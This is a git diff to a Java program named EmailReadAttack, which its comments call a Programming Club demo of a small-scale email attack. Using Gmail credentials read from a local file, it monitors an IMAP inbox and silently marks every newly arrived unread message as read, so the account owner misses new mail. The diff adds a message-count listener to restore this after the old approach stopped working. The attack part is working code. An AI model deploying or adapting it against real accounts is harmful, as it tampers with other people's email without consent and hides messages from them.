@@ -15,6 +15,8 @@ import jakarta.mail.event.ConnectionAdapter;
 import jakarta.mail.event.ConnectionEvent;
 import jakarta.mail.event.MessageChangedEvent;
 import jakarta.mail.event.MessageChangedListener;
+import jakarta.mail.event.MessageCountEvent;
+import jakarta.mail.event.MessageCountListener;
 
 /**
  * A demo for Programming Club of a small-scale email attack. When having login
@@ -34,8 +36,13 @@ import jakarta.mail.event.MessageChangedListener;
  * requires previous steps: less secure access for apps and stored credentials.
  * However, you do not need to know the exact login credentials for the attack.
  * 
+ * Update:
+ * This demo no longer works with MessageChangedListener for new emails for some
+ * reason, so I added a MessageCountListener too. I have to use an app password
+ * now instead of the real password.
+ * 
  * @author Pranav Amarnath
- * @version April 19, 2021
+ * @version October 08, 2022
  *
  */
 public class EmailReadAttack {
@@ -44,7 +51,7 @@ public class EmailReadAttack {
     private String password;
     private final int IMAPS_PORT = 993;
     private final String HOST = "imap.googlemail.com";
-    private final String PATH = "/credentials.txt";
+    private final String PATH = "/credentials2.txt";
     private Folder emailFolder;
 
     /**
@@ -98,7 +105,31 @@ public class EmailReadAttack {
                 }
             }
         });
+        
+        emailFolder.addMessageCountListener(new MessageCountListener() {
+            @Override
+            public void messagesAdded(MessageCountEvent e) {
+                System.out.println("Message added");
+                try {
+                    for(int i = 0; i < e.getMessages().length; i++) {
+                        if(!e.getMessages()[i].isSet(Flags.Flag.SEEN)) {
+                            System.out.println("[LOG] Received Unread Message: " + e.getMessages()[i].getSubject());
+                            // If this flag (SEEN) is not the one that has changed i.e. the read values on
+                            // client and server are same, return
+                            e.getMessages()[i].setFlag(Flags.Flag.SEEN, true);
+                            System.out.println("[LOG] Changing to Read... 😈");
+                        }
+                    }
+                } catch (MessagingException e2) {
+                    e2.printStackTrace();
+                }
+            }
 
+            @Override
+            public void messagesRemoved(MessageCountEvent e) {
+            }
+        });
+        
         emailFolder.addMessageChangedListener(new MessageChangedListener() {
             @Override
             public void messageChanged(MessageChangedEvent e) {
@@ -134,6 +165,7 @@ public class EmailReadAttack {
                 // command is issued (for example when we mark as read).
                 try {
                     ((IMAPFolder) emailFolder).idle();
+                    emailFolder.getMessageCount();
                 } catch (MessagingException e) {
                     e.printStackTrace();
                 }
